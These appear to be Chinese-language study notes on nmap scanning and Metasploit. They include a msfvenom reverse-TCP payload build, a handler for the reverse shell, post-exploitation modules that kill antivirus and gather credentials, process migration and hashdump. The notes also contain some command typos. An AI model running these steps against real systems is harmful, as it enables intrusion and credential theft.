#### 1.namp

##### 1. 主机发现：

```
-PS Syn Ping,那就是TCP
-PA ask Ping，也是TCP
-PU ping udp，
-PE  #ICMP PING，很多主机都封锁了，适用于管理员监视内部

-n 不对活动的ip进行反向域名解析，提高扫描速度
-R 对活动的IP进行反向域名解析
```

默认主机发现命令：

```sh
nmap xxx.xxx.xxx.1-255
```

Nmap会发送一个ICMP的echo请求，一个TCP SYN包给443端口，一个TCP ACK包给80端口，一个ICMP时间戳请求。

会返回一个IP地址段中活动的主机，IP地址，主机域名，开启的服务以及相应的端口，MAC地址等。

其他命令：

```sh
nmap -sP xxx.xxx.xxx.xxx # ping扫描，只列出存活主机
namp -Pn xxx.xxx.xxx.xxx # 无ping扫描，结果和默认主机发现一样
```

其他参数：

```sh
-O # 启用操作系统检测
-sV # 探测服务版本信息
-v # 啰嗦模式
--script=script_name # nse脚本
```



##### 2. 端口扫描

```sh
nmap -p 1-65535 xxx.xxx.xxx.xxx #-p 扫描指定端口
```

###### 1.常用扫描参数：

```sh
-sT #扫描用TCP连接
-sS #扫描用syn
-sU #扫描用UDP
-sA #扫描用ACK
-sF #扫描用FIN
```



###### 2.nmap识别的6种端口状态：

- open：应用程序使用该端口接受TCP或UDP报文

- close：nmap能收到响应，但是没有应用在此端口监听

- filtered（被过滤）：探测报文被过滤，nmap无法确认端口是否开放。过滤设备可能是`专业防火墙设备`，`路由规则`或`主机上的软件防火墙`

- unfiltered：未被过滤状态意味着端口可访问，但Nmap不能确定它是开放还是关闭。

  只有用于映射防火墙规则集的ACK扫描才会把端口分类到这种状态。

- open|filtered（开放或被过滤）：开放端口但不响应。也有可能是被过滤掉。

- closed|filtered（关闭或被过滤）：该状态用于Nmap不能确定端口是关闭的还是被过滤的。



##### 3. 防火墙、IDS逃逸





#### 2. Metasploit

##### 1. 模块划分

- 辅助模块（Auxiliary，扫描器），扫描主机，寻找可用漏洞
- 渗透攻击模块（Exploit），漏洞利用
- 攻击载荷模块（Payloads），
- 后渗透模块（Post），内网渗透操作
- 编码器模块（Encoders），选择编码技术，绕过杀软。

模块所在地址: `/usr/share/metasploit-framework/modules/`

使用步骤：

```sh
search xxx
use xxx
show options
set xxxx yyyy
run
```

一些其他命令：

```sh
reload_all  #重载所有模块,导入自定义模块后，
back # 后退，移除当前上下文，用于切换模块
info # 目标和模块详细信息

session # 会话管理
session -l #列出所有绘画
session -K # 终止
session -i id # 进入某个会话

show xxx

```



##### 2. 攻击载荷和编码

msf下

```sh
use windows/meterpreter_reverse_http	
```



使用msfvenom

```sh
msfvenom -p windows/x64/meterpreter/reterse_tcp Lhost=攻击机的ip Lport=攻击机监听端口 -f exe > msf.exe	
# -p 指定payload
# -e 编码器
# -i 迭代器
# -f 输出格式
```

###### 1. 监听反弹shell

```sh
> use exploit/multi/handler
> set payload windows/meterpreter/reverse_tcp #
> set lhost xxx.xxx.xxx.xxx
> set lport xx
> run
```



##### 3. 后渗透

```sh
run post/windows/gather/checkvm		#检查目标是否虚拟机
run post/linux/gather/checkvm
run post/windows/manage/killav		#关闭杀软
run post/windows/manage/enable_rdp	#开启目标远程桌面
run post/windows/gather/enum_logged_on_users	#列举当前登陆用户，和最近登陆过的用户
run post/windows/gather/enum_applications		#列举应用程序
run windows/gather/credentials/windows_autologin #列举自动登陆的用户名和密码
```



##### 4. 持久化

刚获得`meterpreter shell`时，shell是很脆弱的，可以将他与目标主机中稳定的程序进行绑定。

一般找上`NT AUTHORITY\SYSTEM`的进程，该账号的权限跟管理员admin一样高优先级。

```shell
getpid # 查看meterpreter shell进行id
ps # 获取目标主机正在运行的进程
migrate 476 # 将shell迁移到pid为476的进程中
```

###### 1. Persistence模块



###### 2. 命令摘要

```sh
pwd,ls,cd
getuid # 查看当前权限
getsystem # 获得系统管理员权限，要本地管理员权限
hashdump #  抓取哈西密码
sysinfo # 查看系统信息
idletime # 查看目标系统已经运行时间
route #查看目标主机网络设置
shell # 进入目标主机shell，exit退出shell
background # 将meterpreter隐藏在后台

upload path  # 上传文件
download path  # 下载文件
search -f path # 搜索文件

sudo rdesktop -f 目标id # kali-linux 登录远程桌面
route add IP 子关掩码 # 添加路由，先background 
```

